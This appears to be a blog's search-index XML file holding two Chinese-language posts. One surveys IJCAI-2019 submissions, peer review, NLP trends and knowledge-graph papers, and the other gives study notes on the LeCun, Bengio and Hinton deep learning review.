<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【论文调研】IJCAI-2019 论文投稿与录用调研报告]]></title>
    <url>%2F2020%2F03%2F13%2F%E3%80%90%E8%AE%BA%E6%96%87%E8%B0%83%E7%A0%94%E3%80%91IJCAI-2019%2F</url>
    <content type="text"><![CDATA[【论文调研】IJCAI-2019 论文投稿与录用调研报告 1. IJCAI会议简介 IJCAI 全称为Internation Joint Conference on Artifical Intelligence(国际人工智能联合会议)。 IJCAI是人工智能领域种最主要的学术会议之一，成立于1969年，地点位于美国加州。 IJCAI举办时间:自1969年以来奇数年每两年举办一次，2015年之后改为每年一届，其中2019年的IJCAI在中国澳门进行，而2020年的IJCAI将在日本名古屋进行。 每届IJCAI会议都会收录大量的高质量的论文，为了表彰一些学者在人工智能领域的突出贡献，大会设定了4个奖项，分别为杰出研究奖、计算机与思想奖、约翰麦卡锡奖、唐纳德·沃克杰出服务奖，以此来表彰专家学者对该领域的服务和贡献。下面就来简单介绍一下每个奖项。 IJCAI历年投稿2019年止论文的投稿情况大体情况如下图所示: 12345678910111213141516171819202122232425关于IJCAI设定的4个奖项:1. 杰出研究奖该奖项每年授予一位科学家，表扬其在整个职业生涯中开展的具有高质量且持续性的研究，并且取得了实质性成果。过去获得这一荣誉的都是人工智能领域最杰出的学者、科学家。该奖项开始于1985年，第一位获得该殊荣的是John McCarthy，他也被称为“人工智能之父”。直至2018年，共有18位学者荣获该奖项。2. 计算机与思想奖计算机与思想奖在IJCAI会议上颁发给杰出的人工智能青年科学家。该奖项是由Edward Feigenbaum和Julian Feldman编辑的计算机与思想书中收取的版税而设立的。它目前得到IJCAI基金的收入支持。该奖项于1971年开始，第一位获得该殊荣的是Jitendra Malik，直至2018年，共有29位学者荣获该奖项。3. 约翰麦卡锡奖约翰麦卡锡奖旨在表彰公认的中期研究人员，通常是在获得博士学位15至25年后，这些研究人员在人工智能领域建立了卓越的研究成果。这个奖项是以约翰麦卡锡(1927-2011)命名的，他被公认为人工智能领域的创始人之一。麦卡锡不仅给这门学科起了名字，还对计算机科学，尤其是人工智能做出了持久重要的基本贡献，包括分时操作系统、LISP编程语言、知识表示、常识推理和人工智能的逻辑学范式。该奖项是在麦卡锡家族的全力支持和鼓励下设立的。该奖项于2015年开始至今，共有四位学者获此殊荣。4.唐纳德·沃克杰出服务奖唐纳德·沃克杰出服务奖由IJCAI董事会于1979年设立，以表彰AI的资深科学家在其职业生涯中对该领域的贡献和服务。直至2018年，共有17位学者获此殊荣。 2. IJCAI-2019会议整体分析 IJCAI-2019会议于2019年8月10日在中国澳门举行，为期七天,这是继2013年第23届IJCAI会议在北京举办过后，又一次在中国举办。 1. 论文投稿情况分析 2019的IJCAI 会议共收到论文4752篇，最终收录的论文为847篇，接收率为 17.9% 。论文提交量和录取量都创历史新高，但录取比率却是近10年最低。 今年 IJCAI 的投稿总数相较于去年增加了约 37%（1282篇），而录取数仅比去年多了141篇，因此，录取率降低也就不足为奇。下图为1997年至今各届会议论文提交量、录取量以及录取比例。 在2019年收录的 847 篇论文中，有 327 篇来自中国，占比 38%。 插曲:2019年的评审、打分、rebuttal等环节不专业出现了严重甚至是可笑的“错误”。主要原因是采用了学生审稿从而导致审稿不专业，审稿意见水品不高等问题。对于作者们的反应和评论，IJCAI 2019 的 PC （program chair，程序主席）Sarit Kraus 给作者们发送了一封邮件，做出了解释，给出了比较中肯的回复，这也得到了不少学者的支持。小编认为，这个问题也反映了近年来不少学者往一些顶级会议投一些水平较低论文，这种“灌水”的行为也是导致论文录用率较低的主要原因，这次事件也值得各个领域的学者反思和借鉴。 在最新的2020年投稿中还未进评审则被拒，近半投稿遭Summary reject IJCAI-2019 投递组织分析，如下所示 12345678910111213141516171819202122232425262728293031323334353637383940【会议审稿流程的简单描述】:1. 对于会议审稿流程而言，由于会议论文往往有比较严格的截止日期（Deadline），作者们通常会根据这一时间来rush自己的paper,待deadline一过，大会的程序委员会主席（Program Committee Chair或Program Chair）首先会剔除一批不符合会议投稿政策的论文，如：篇幅不合要求、一稿多投、未匿名、未注明Conflict Domain等，这些论文会直接作“Desk Reject”处理。处理之后的投稿（Submission）便为有效投稿。2. 这些稿件会由PC Chair根据一定规则分配给高级程序委员会委员（Senior PC，IJCAI/AAAI一般是这个叫法）或领域主席（Area Chair，CVPR/ICCV/ECCV一般用此称谓），这些人便是论文最终命运的判决者，也是在审稿最后时刻书写meta review的meta reviewer——一般会由领域内颇有建树、有判断力的专家学者担任。而后，这些meta reviewer会继续分配稿件给到实际操刀审稿、给出具体审稿意见的审稿人（Reviewer）。对于CVPR/ICCV/ECCV等CV领域会议，近几年每个AC负责的文章大约在30-50篇左右，而普通审稿人分配的稿件一般不超过10篇/人。以CVPR 2019为例，针对5160篇有效投稿，全球共召集了132位AC和2887位审稿人。一共提交了超过15000条审稿意见，做到了平均一篇文章至少3条，其中一篇文章甚至有7条审稿意见之多。3. rebuttal环节: 在reviewer各自独立提交审稿意见并经由AC检查质量之后，绝大多数会议会将首轮意见开放给作者（目前Data Mining领域的KDD、ICDM等仍保持不设rebuttal环节的传统），作者可根据意见内容进行rebuttal来更正审稿人理解的错误、解释/澄清审稿人的疑虑、提供更多方法和实验细节等信息。在收回作者rebuttal之后，同一篇文章的首轮意见、作者rebuttal信息均会开放给所有审稿人和责任AC，进入paper discussion环节。4.paper discussion环节:Discussion时，AC会主持每篇文章的讨论，每位审稿人根据其他审稿人意见和作者rebuttal会留言给其他审稿人。经过几天系统线上讨论，所有审稿人需更新自己最终意见。更新的意见以及整个讨论过程，再加上AC自己的判断会作为AC给予每篇论文生杀予夺的重要依据：若多数审稿人在rebuttal后提高了论文得分或保持accept认为可以接收，则文章有较大概率可被录用；若多数审稿人在rebuttal后降分或保持reject，则这篇文章命运便岌岌可危。可以看到，rebuttal在整个论文录用过程中起到了举足轻重的作用——优秀的rebuttal能力挽狂澜；无力的rebuttal则于事无补甚至会画蛇添足、过犹不及。5. 特别的，CV领域的会议如CVPR/ICCV/ECCV等在AC给予最终决定时，有开线下AC meeting的传统，即在paper discussion之后会选在某个城市线下召集所有AC共同决定了投稿的最终命运。一般而言，一篇文章是否录用由三位（有时两位）没有conflict domain的AC共同决定，称作“AC Triplet”。到此，每篇会议论文最终结果（录用与否以及oral、poster、spotlight）便盖棺定论，等待着PC Chair公布给如坐针毡的作者们。以上内容来自于:https://zhuanlan.zhihu.com/p/104298923?utm_source=qq 2. 论文投稿的主题组成 在论文的主题上，机器学习依然是最热的一个领域，收录数量为 438 篇，超过半数，且提交论文中，共有 2516 篇为机器学习领域，此外论文数量最多的领域依次为计算机视觉，机器学习应用，自然语言处理。各个主题的提交于录用情况如下图所示: 由上图可知，其中NLP submitted 630篇，而最后录用的只有103篇，Knowledge representation投稿349篇，最终录用88篇 3. IJCAI-2019 NLP 领域的研究风向与分析 1. IJCAI-2019 NLP领域的研究概况IJCAI 2019 NLP领域占全部接受论文总数的9.91%，较去年有所下降，主要集中在如下的几个方面: Sentiment Analysis Cross-Modal Information Information Retrieval Text Classification Q&amp;A Visual Dialog 可视化对话 Word Embedding knowledge Representation Text style transfer Named Entity Recognition Sentiment detection Relation Extraction Network Embedding Text Generation Machine Translation etc. 2. IJCAI-2019 NLP领域的详细概况根据IJCAI-2019 NLP的录用的所有文章的总结,详细分析如下(为方便观看，截图如下): 1以上83篇论文可到[4] https://github.com/Pin-Ni/NLP-in-IJCAI-2019下载 有意思和新颖的主题如：图像与文本的匹配，多人对话(公司参与，落地)，$GAN$做文本生成，文本风格迁移，实体与事件提取 将知识融入NLP架构 常识推理 科学问答 关于知识图谱构建的NLP的一些子任务: 关系抽取，命名实体识别，依存句法分析，$Word Embedding$,$Releation Embedding$，实体链接(EL,主要有端到端以及仅消除歧义两类方法)，细粒度抽取 社交媒体分析是与自然语言处理密切相关的研究主题，在最近的与NLP相关的会议中，无论从提交的数量还是参与者的人数来看，很明显，情感分析和社交媒体分析无疑是两个主要的研究主题 多模态学习 迁移学习/多任务学习 从应用程序的角度来看，新颖的在线应用程序涉及社交媒体分析和情感分析，例如紧急情况管理，社交推荐，用户行为分析，用户社交社区分析和未来预测是NLP和AI研究人员关注的主题 无监督预训练火热，主要是由BERT(2018年10月诞生)以及其他变体驱动(Bert with his friends) 图卷积网络在自然语言处理任务上的进展 12345678910111213补充点:1. Cross Modal 跨模态跨模态学习日益引起了学术界和工业界的关注。跨模态学习进行联合特征学习和跨模态关系建模，旨在有效地利用不同模态内容的相关性进行系统性能优化。对多模态内容的深入理解主要依赖于特征学习、实体识别、知识图谱、逻辑推理、语言表达等方面的多种技术。2. Cross Modal Information Retrieval 跨模态信息检索模态是指数据的存在形式，比如文本、音频、图像、视频等文件格式。有些数据的存在形式不同，但都是描述同一事物或事件的。而我们在信息检索的需求往往不只是同一事件单一模态的数据，也可能需要其他模态的数据来丰富我们对同一事物或事件的认知，此时就需要跨模态检索来实现不同模态数据之间的检索。 3. IJCAI-2019 NLP领域知识图谱类论文解读(部分)Section 1 【知识图谱对齐】Multi-view Knowledge Graph Embedding for Entity Alignment 多视角知识图谱嵌入的实体对齐 1234567891011121314151617181920212223242526272829303132333435363738394041421. 什么是知识图谱嵌入（KGE)?知识图谱嵌入作为一种新的研究方向，关键思想是嵌入KG的组件，包括将实体和关系转化为连续的向量空间，从而简化操作，同时保留KG的原有的结构。那些实体和关系嵌入能进一步应用于各种任务中，如KG补全、关系提取、实体分类和实体解析。具体可参考: 《Knowledge Graph Embedding: A Survey of Approaches and Applications》和刘知远老师的《知识表示学习的研究与进展》做的总结2. 什么是实体对齐?* 实体对齐(Entitiy alignment) 旨在发现不同知识图谱中称为真实世界相同事物的实体,* 实体对齐是指给定两个网络，把两个网络中等价的实体合并。实体对齐在很多领域都有重要应用，比如，跨平台社交网络的用户对齐可以用于用户画像、用户兴趣挖掘，跨语言知识图谱的实体对齐可以辅助机器翻译、跨语言信息检索。* 其中基于知识图谱嵌入的实体对齐方法近来备受关注，2019年可以说是对齐任务模型爆炸增长的一年，新的方向和思路层出不穷，主要分为四个： * 无监督对齐,第一种思路是让结构和属性信息相互”监督“，从而达到不需要预先匹配实体的效果,另一种思路是基于对抗的方法对齐两个网络。让判别器区分两个网络中生成的点，直到判别器无法判别生成的点来自哪个网络，两个网络就对齐了。 * 多视角嵌入，由于对齐问题的复杂性，单一模型的嵌入能力往往不足以对齐两个网络，因此从多种视角来对齐效果会更好 * 改进现有的嵌入表示模型并用于对齐。相当于从底层改进对齐效果， * 超大规模对齐3. 现有基于嵌入的实体对齐方法存在什么问题?a. 知识图谱存在多种特征，现有方法仅利用了其中的一种或两种，被广泛使用的特征是关系型 三元组 (relation triples) ，近来也有方法尝试使用属性型三元组 (attribute triples)，但并未完全利用知识图谱的已有特征，因此本文希望整合使用多种特征来提升实体对齐的效果；b. 现有方法依赖大量的已对齐实体对作为监督信息来训练模型，然而这些监督信息在现实中很难获得。此外，现有方法大多忽略或不重视关系或属性对齐，而关系或属性对齐可以在很大程度上帮助实体对齐任务。3. 论文贡献与方法提出了一种基于多视图知识图谱嵌入的实体对齐框架，称为 MultiKE,主要有以下几点: a. 从数据出发，我们定义了三种具有代表性的视图，分别是：名称视图 (name view)、关系视图 (relation view) 和属性视图 (attribute view)，如上图所示，并针对每个视图采用适当的模型进行训练；b. 针对实体对齐任务，我们从实体和关系或属性两个层面设计了跨知识图谱监督方式，来保留和丰富对齐信息c. 提出了三种组合策略，从多个特定视图的实体表示中，获得最终的用于实体对齐任务的实体表示；d. 两个数据集上进行实验，实验表明 MultiKE 在实体对齐任务上明显优于当前已有的相关方法。由于本篇文章主要是关于IJCAI-2019 的概览，因此对具体细节不做讨论,具体方法与实验可详见论文 Relation-Aware Entity Alignment for Heterogeneous Knowledge Graphs 【实体对齐】 12345678910111. 论文动机与贡献该论文旨在解决知识图谱中的实体对齐问题，为了能够捕获复杂的语义信息，作者提出了一种关系敏感式对偶图卷积网络（Relation-aware Dual-Graph Convolutional Network, RDGCN）模型。如上图所示2. 论文方法a. 首先，基于原始的图结构构建对偶关系图；b. 然后，通过原始attention层和对偶attention层进行迭代；c. 接着，通过GCN网络进一步结合结构信息；d. 最后，得到实体的向量表示，用于实体对齐任务。实体抽取该论文的实验部分采用了JAPE的数据集DBP15K，主要对比方法有MTransE、JAPE、IPTransE、BootEA和GCN-Align，该论文所提出的方法RDGCN取得了相对较优的结果。 Entity Alignment for Cross-lingual Knowledge Graph with Graph Convolutional Networks 1234567891011121314151617本文提出了一种基于图卷积网络的跨语言实体对齐方法，通过设计一种属性 embedding 用于 GCN 的训练，发现GCN能同时学习到特征 embedding 和属性 embedding 的信息。实验表明该方法是目前性能最好的的 GCN 对齐模型。1. 动机在近期的研究工作中， GCN被用来处理一些基于图的学习问题，也有研究者提出基于该模型的跨语言知识图谱实体对齐工作。但这些工作并没有有效的利用图谱的属性信息，且对整体模型带来了负面的影响，这主要是因为对于同一实体，在不同语言上，它的属性存在较大的差异。虽然也有研究者提出异构图注意力网络，提供了节点级与语义级的注意力机制。但这个方法依然没有考虑不同属性带来的影响。基于上述分析，作者提出利用GCN的聚合能力将属性embedding加入跨语言知识图谱对齐中。2. 方法上图描述了本文提出模型的主要框架和流程，待对齐的知识图谱主要提供了两个角度的信息，其一是图谱本身的图结构信息，这个部分被直接输入到GCN中， GCN包含多层网络，其二，为了提高不同语言实体信息embed到统一的向量空间中的精准性，作者设计了增强的属性embedding方法，用于减少不同语言对等实体之间的差异性。 Section 2 【知识图谱嵌入与链接预测】Neural Collective Entity Linking Based on Recurrent Random WalkNetwork Learning 【实体链接】 1234567891011121314151617181920212223242526272829303132331, 动机与成果由于神经网络具有良好的学习语义表征能力，现有的实体连接研究已经开始借鉴利用神经网络的局部特征对实体兼容性和不同 EL 决策间的全局相互依赖性进行目标实体消歧。 然而，大多数神经元集体 EL 方法完全依赖于神经网络来自动建模不同 EL 决策之间的语义依赖关系缺乏来自外部知识的指导在本文中，我们提出了一种用于共同的EL的具有递归 random-walk layers的端到端神经网络上图则为RRWEL模型2. 方法首先，我们建立了一个基于局部上下文特征的模型，然后，在此基础上提出了一个基于局部上下文特征的模型然后堆叠random-walk layers，以加强证据使得相关的 EL成为高概率决策，其中候选实体之间的语义相互依赖性主要是从一个外部知识库引导。 最后，在传统的目标函数中引入一个语义规则器，保持集体 EL 决策的一致性，从而使外部 EL 决策具有一致性知识库可以在集体 EL 决策中充分利用。 实验结果和对各种数据集的深入分析表明，本文的模型比其他最先进的模型获得了更好的性能3. 关于实体链接的简单补充* 实体链接任务是做什么的?实体链接（entity linking）就是将一段文本中的某些字符串映射到知识库中对应的实体上。比如对于文本“郑雯出任复旦大学新闻学院副院长”，就应当将字符串“郑雯”、“复旦大学”、“复旦大学新闻学院”分别映射到对应的实体上。在很多时候，存在同名异实体或者同实体异名的现象，因此这个映射过程需要进行消歧，比如对于文本“我正在读《哈利波特》”，其中的“《哈利波特》”应指的是“《哈利波特》（图书）”这一实体，而不是“《哈利波特》系列电影”这一实体。当前的实体链接一般已经识别出实体名称的范围（一般称作mention），需要做的工作主要是实体（称作entity）的消歧。也有一些工作同时做实体识别和实体消歧，变成了一个端到端的任务。* 实体链接的难点在于两个方面，即多词一义和一词多义* 实体链接包括两个步骤，即指称识别和实体消歧（或者候选实体生成和候选实体排序）两个过程 Robust Embedding with Multi-Level Structures for Link Prediction M-GNN 架构 Graph coarsening 图采样/图粗化 12345678910111213141516171819201. 论文动机* 知识图谱嵌入对于链接预测而言，至关重要，最近有许多研究应用encoder-decoder模型来解决这个问题，其中encoder主要归纳为graph neural network，decoder部分主要使用一种embedding的方法，这些方法强制在结构信息中使用embedding技术，非常糟糕的是基于GNN框架的这种方法仍然面临着3个严重的问题： * low represential power 代表能力过于低下 * stacking in a flat way 始终不断的堆叠模型 * poor robustness to noise 对于噪声情况鲁棒性过差* 在本文中我们提出了一个新的多层图卷积模型(M-GNN)来解决上述面临的挑战，模型架构如上图1所示2. 论文的思路* 首先我们确定了一种injective aggregate schema 并且设计了一种使用多层感知机(MLPs)的GNN layer* 其次,我们定义了对于多种关系之间的Graph coarsening(图粗化/图池化，实际目的就是用来生成图表示，核心要义在于：操作本身要对结点顺序不敏感，为了使得同构图的表示能够保持一致，大体显示如上图2所示）同时在这一系列图池化中堆叠GNN layers,以便为层次结构建模。 此外，我们在方法中使用了注意力机制，目的是为了让我们的方法在噪音较大的知识图谱中也能够多出准确的链接预测任务最后的结果是在FB15k-237上表示显著，M-GNN 具有很强的鲁棒性到稀疏和噪音。 Unsupervised Embedding Enhancements of Knowledge Graphs using Textual Associations 使用文本关联的知识图谱无监督嵌入增强 12345678910111213141516171819201. 动机知识图谱嵌入对于表示多关系数据并从中学习是有用的，最近的嵌入模型显示出从现有数据库中推断新事实的高效性。但是，这种结构精确的数据通常在数量和范围上受到限制。因此，要完全优化嵌入，还必须考虑更广泛的可用信息源，例如文本。2. 论文思路本文介绍了一种无监督的方法，该方法通过使用关联词的嵌入来增强实体嵌入来合并文本信息。该方法不会修改知识图谱嵌入的优化目标，而是可以将其与现有的嵌入模型集成。考虑了两种不同形式的文本数据，针对每种情况建议了不同的嵌入增强功能。* 在第一种情况下，每个实体都有一个描述它的关联文本文档。* 在第二种情况下，文本文档不可用，而是实体以单词或短语的形式出现在非结构化的文本片段中。实验表明，将两种方法应用于许多不同的知识图谱嵌入模型时，都可以改善链接预测任务。3. 论文小结本文讨论了两种新颖的方法，可以利用文本数据中的信息来增强知识图中的实体嵌入。第一种方法将实体矢量表示为与每个实体相关联的单词的直接函数，并且只要文本数据以实体描述的形式可用，就可以应用。 第二种方法在文本文档上训练 word2vec 算法，并将它从实体名称中学到的功能添加到原始实体功能向量中。实证结果表明，如果文本数据具有足够的质量，则与没有文本的嵌入和用于合并文本的替代方法相比，这两种方法都可以提高许多不同嵌入模型上的链接预测精度。 Section 3 【关系抽取与关系表示】【Relation Extraction Using Supervision from Topic Knowledge of Relation Labels】关系抽取 123456789101112131415161718192021222324252627282930313233343536371. 动机* 关系抽取旨在基于文本上下文识别出实体对的语义关系。这些关系通常是预先定义好的。例如，给定实体对[ Microsoft, Bill Gates ]和句子“Bill Gates co-founded Microsoft withhis childhood friend Paul Allen”，我们希望抽取出关系“ founder ”。* 传统的方法通常将关系抽取建模为分类问题或者标注问题。在这些方法中，不同的关系标签往往被视为不同的 ID。例如，在关系分类中，每个 ID 代表多分类问题的一个类别（ class ）。给定一个样本，模型将其映射到一个或多个关系 ID 。然而，关系标签包含着非常丰富的语义信息，这些语义信息被现有的关系抽取模型所忽略。我们认为，充分建模关系标签的语义信息并将其作为关系分类的监督信号，有望进一步提升关系抽取性能。很显然，仅仅靠关系标签这个词组本身很难挖掘出太多的语义信息。因此，我们需要引入额外的信息作为关系的背景知识。* 为了克服这一挑战，本文求助于主题模型。对于预定义关系，我们通过相应的训练句子集合进行主题建模，进而从训练数据中挖掘出关系的主题知识。我们的基本假设是：对于每个关系，其标注句子集合包含几个潜在主题，并且这些主题在语义上与关系是相关的。通过主题建模，我们提取前k个带权重的主题词来表示关系的语义。因此，关系的主题知识被具体化为带权重的词袋（ weighted bag of words， WBoW ）。不难理解，每个主题词都刻画了关系的某些方面，而词的权重则刻画了它对关系的重要性。因此，一个被标注为该关系的句子应该匹配关系的某些重要方面。2. 方法* 上图左边表示了应用关系的主题知识的框架流程图，主要步骤为: * 步骤1：从训练句子中检索关系r的所有句子。 * 步骤2：获取 r 的主题知识，即通过主题建模从r的标记句子集合中提取前k个加权主题词。 * 步骤3：为句子-关系对（ s; r ）建立深度匹配网络。 * 步骤4：基于主题知识，通过 Word Mover Distance（ WMD ）计算 s 和 r 之间的语义距离 d ( s,r )。 * 步骤5：根据语义距离 d ( s,r ) 计算样本的重要性权重。 * 步骤6：基于深度匹配网络和样本重要性权重建立损失函数。* 上图右图表示了句子关系匹配网络，主要包括三个部分: * 句子学习模块 * 按照头尾实体的位置，我们将句子分成三部分。主要原因有两个。第一：在一个句子中，表达实体对关系的往往位于实体对之间。因此，每部分对于关系推理的贡献是不一样的。第二，为了后续注意力机制的处理，将句子分块可以显著提升效率。句子学习模块主要采用多头的注意力机制（ multi-head self-attention ）。此外，关系敏感的注意力机制（ relation-awareattention ）旨在将学习到的句子特征中关系敏感的部分抽取出来，从而降低噪声的影响。 * 关系学习模块 * 关系学习模块的输入是关系的主题词集合。在该模块中，我们仍采用自注意力机制。但值得注意的是，在输入词袋中我们考虑了每个词的先验权重，因此，我们希望在自注意力机制学习中将该先验权重考虑进去。这在 weighted multi-head self-attention 中实现。 * 句子关系匹配模块 * 基于学到的句子表示和关系表示，我们采用简单的全连接操作实现匹配建模 4. IJCAI-2019 NLP WorkShop的研讨热点回顾 W4 Financial Technology and Natural Language Processing (FinNLP) 1234567891011W4: Leveraging BERT to Improve the FEARS Index for Stock Forecasting 利用BERT改进股票预测的FEARS指数“Financial and Economic Attitudes Revealed by Search (FEARS) index reflects the attention and sentiment of public investors and is animportant factor for predicting stock price return. In this paper, we take into account the semantics of the FEARS search terms by leveraging the Bidirectional Encoder Representations from Transformers (BERT), and further apply a self-attention deep learning model to our refined FEARS seamlessly for stock return prediction. We demonstrate the practical benefits of our approach by comparing to baseline works.” W11 Semantic Deep Learning (SemDeep) 语义深度学习 W12 Big Social Media Data Management and Analysis (BSMDMA) 社交大数据的管理与分析 W16 Linguistic and Cognitive Approaches to Dialogue Agents (LaCATODA) 对话Agents的语言与认知方法 W17 Bringing Semantic Knowledge into Vision and Text Understanding 将语义知识引入视觉和文本理解 W22 Search-Oriented Conversational AI (SCAI) 面向搜索的对话Ai W31 Language Sense on Computer 计算机语感 W45 Natural Language Processing for Social Media (SocialNLP) 社交媒体自然语言处理 1234567891011Natural Language Processing for Social Media (SocialNLP)Ex-Twit: Explainable Twitter Mining on Health Data Ex-Twit:可解释的Twitter健康数据挖掘“Since most machine learning models provide no explanations for the predictions, their predictions are obscure for the human. The ability to explain a model&apos;s prediction has become a necessity in many applications including Twitter mining. In this work, we propose a method called Explainable Twitter Mining (Ex-Twit)combining Topic Modeling and Local Interpretable Model-agnosticExplanation (LIME) to predict the topic and explain the model predictions.We demonstrate the effectiveness of Ex-Twit on Twitter health-related data.” 4.IJCAI-2019 NLP领域在学界和产业界的探讨 覆盖面较广，多不同领域学科的投稿。实用性较强，不拘泥于学术研究，很多业界的工具和技术的展示也在其中占有重要的分量。 创新性较强，较其它领域会议有较多跨领域的前沿方向探索。 参会人员多样，研究领域各不相同。业界人员参会数量大 国人在NLP领域内扮演重要角色 更多强调真实世界数据、实际应用场景的研究的出现 不足之处，欢迎批评指正 1234567891011121314151617参考文献:[1] https://www.zhihu.com/search?type=content&amp;q=IJCAI%E4%BC%9A%E8%AE%AE%E4%BB%8B%E7%BB%8D[2] https://www.zhihu.com/search?type=content&amp;q=ijcai%202020%20NLP%20%E8%AE%BA%E6%96%87%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A[3] https://www.paperdigest.org/2019/08/ijcai-2019-highlights/[4] https://zhuanlan.zhihu.com/p/74574073[5] https://www.aminer.cn/research_report/5cecc3f41976c5c87c8bee63[6] https://zhuanlan.zhihu.com/p/81073607[7] https://www.ijcai.org/Proceedings/2019/0728.pdf[8] https://www.ijcai.org/proceedings/2019/0725.pdf]]></content>
      <categories>
        <category>论文调研</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>会议论文</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【论文解读】深度学习综述]]></title>
    <url>%2F2019%2F08%2F01%2F%E3%80%90%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB%E3%80%91%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BB%BC%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[【论文解读】 深度学习综述(Deep Learning) 本文主要是Paper论文精读系列第一篇文章主要关于深度学习综述的内容 0.1 论文介绍和作者介绍 作者: Yann LeCun, Yoshua Bengio, Geoffrey Hinton Geoffrey Hinton 多伦多大学 1986 反向传播算法 1983 发明波尔茨曼机 2012 对卷积神经网络进行改进 Yann LeCun 1980 发明卷积神经网络 1980末 首次将卷积神经网络用于手写数字识别 Yoshua Bengio 蒙特利尔大学 1990 将神经网络和概率模型结合在一起 2000 使用高维词向量来表征自然语言处理 文章发表时间:2015 0.2 论文意义和主要内容 论文意义: 总览深度理论,模型,展开人工智能的新蓝图 探究深度学习最重要的算法和理论 主要内容 概念: 深度学习允许多个处理层组成的计算模型来学习具有多个抽象级别的数据表示,这些方法极大地改善了语音识别 改善了视觉对象识别,物体检测以及药物发现和基因组等其他领域的技术 原理: 深度学习通过使用反向传播算法来指示机器应该如何更改其内部参数(用于从前一层的表示计算每个层中的表示)来发现大数据集中的复杂结构 应用: 深度卷积网络CNN在处理图像,视频,语音和音频带来了突破 而循环神经网络对文本和语音等顺序数据进行了彰显 0.3 论文结构: 1.引言 Introduction 2.监督学习 Supervised Learning (P1-P3) 3.反向传播算法 BackPropagation 4.卷积神经网络 CNN Convolutional neural networks 5.基于深度神经网络的图片理解 Image understanding 6.分布表示和语言模型 Language processing 7.循环神经网络 RNN Recurrent neural networks 8.深度学习的未来 The future 0.4 前期知识储备 了解基本的机器学习算法 RNN: 循环神经网络,掌握RNN的基本工作原理 CNN: 了解神经网络的结构和工作原理0.5 课程安排和学习建议 day1 论文视频讲解 day2 泛读论文,已经标注了重点 day3 论文视频讲解 day4 精读论文,写分析笔记 day5 论文视频讲解 day6 作业,撰写博客 0.6 学习建议 精读经典论文 跟进最新论文 整理关注论文 复现领域论文 加深对论文的理解 提高算法的能力 写作论文 1.引言 123解释: 深度学习方法是拥有多级表示的学习方法,通过组合简单但非线性的模块来获得,每个模块将表示一个级别,从原始的输入开始转换为更高的表示,稍微更多的抽象层次呢,能够足够地组合这种变换,可以学习非常复杂的功能简单的方式理解: 用深度学习的方式和方法,多层的神经网络,来找到一个函数,这个函数能够被学习,这个函数最后能够表示非常复杂的功能比如语音识别,比如图片识别. 1.1 多层神经网络 Multipe Layers of simple units Each units compute a weighted sum of its inputs Weighted sum is passed through a non-linear function The learning algorithm changes the weights 激活函数:ReLU 1.2 深度学习应用领域 计算机视觉 无人驾驶 图片识别领域 自然语言处理 智能搜索 人机会话等 医学图像分析 自动驾驶 制药等 1.3 深度学习的应用举例 机器翻译 下围棋 目标检测 人脸识别 自动驾驶 2 监督学习(Supervised Learning) 123解释: 我们需要计算一个目标函数来测量出分数与所需分数之间的误差,其实就是距离,然后内部修改其内部的参数减少此错误(BP反向传播),这些可调的参数,我们通常称之为权重,是实数,可以看作是定义机器输入与输出功能的旋钮.在典型的机器学习系统中,可能存在这种可以调节的数以亿计的权重.以及可以训练机器数以亿计的这些示例.简单解释:我们有答案,也有数据,需要找到答案和数据之间的规律,而这些规律是什么,就好比调节收音机的旋钮一样,需要去调节参数,使用的是BP算法 2.1 梯度下降算法 直观解释:从山上某点到山谷的过程 3 反向传播算法(Backpropagation)(P4-P6) 12345解释: 图(a) 仅仅包括2个输入层,2个隐藏层,1个输出层的示例 图(b) 链式法则 图(c) 正向传播 图(d) 反向传播 3.1 链式法则(Chain Rule) 12345链式法则: Case1: x的微小变化引起y的微小变换,同时y的微小变换有引起z的微小变化 Case2: 该case表明链式法则可能不仅仅是影响一个因素,也可能影响多个因素 3.2 反向传递(Backward transfer) 12Forward Pass: 从前向后,是一个计算的过程Backward Pass: 从后向前,是一个误差传递的过程,误差传递的过程也就是学习的过程 4 卷积神经网络 CNN 123456萨摩耶犬的图像识别 - rgb三个层次 - 识别是萨摩耶还是狼狗 - 信息自下而上的流动 - 较低级别的特征充当边缘的检测器,并输出每一个图像类别的计算分数 - 通过不同层来进行特征的获取 4.1 什么是CNN? 12345卷积神经网络的过程: 1. 预处理的数据用于卷积的计算,加上bias得到局部特征,其卷积核的尺寸和个数对模型的效果有一定的影响 2. 将第1步的输出结果进行非线性函数的处理,如目前常用的ReLU函数. 3. 进行池化操作,所谓池化操作实际是取出区域的平均值或者最大值,保留显著的特征,提升对激变的容忍能力 4. 全连接层,表示对结果的确认. 动画演示如下: 5 CNN理解图片(Understanding Image by CNN) 看图说话: 6.分布式表示和语言模型(Language processing) 6.1 理解Embedding(Understanding Embedding) 12独立热编码: 1个位置代表一个词意,但是不能代表一个词真正的意思,one-hot 会维度很大Word Embedding: 相近的词汇有相近的意思 123- 句子也可以进行Embedding- word embedding- sentence embedding 6.2 Word2Vec算法(2013提出) 循环神经网络 7.1 理解RNN 1234循环神经网络的特点如上所述: - 时间序列 - 隐藏层会保持以前的数据 - 带有存储功能的神经网络 7.2 LSTM(Long Short-term Memory) 1231. 特殊的RNN,也是门限RNN2. 主要解决RNN训练过程中梯度消失和梯度爆炸的问题3. 比普通的RNN更好 未来(Future) 非监督学习 强化学习 GAN(Generative Aversarial Networks) 自监督学习 问题: 提高入读门槛,多看顶会论文 看论文先读摘要,绪论以及结论部分,了解论文的核心内容,契合研究方向进行精度细粒读 代码复现可取github 调参技巧: 模型参数大于数据量大时,相当于求解一个欠定方程,容易多解,过拟合 模型参数远小于数据量时,相当于求解超定方程,可能误解,或有解但准确率低,欠拟合 模型参数如何与数据量做到匹配,是一个工程问题,需要结合问题和数据量多做 如何确定一层卷积使用多少个卷积核 卷积核的个数要随具体问题数据量参数大小等决定,没有绝对的方法定多少个 卷积核其实就是最后用于提取特征的映射函数的参数,随具体训练而定,刚开始随机初始化,后面逐渐进行优化,所以最后不会一模一样 为什么CNN可以提取特征?卷积是如何把特征提取出来的? CNN是利用卷积操作提取特征,32个卷积核就是学习32种特征,卷积操作其实就是对应内积再求和,不同位置结果不变,具有空间位移不变性,所以可以提取特征 激活函数的作用: 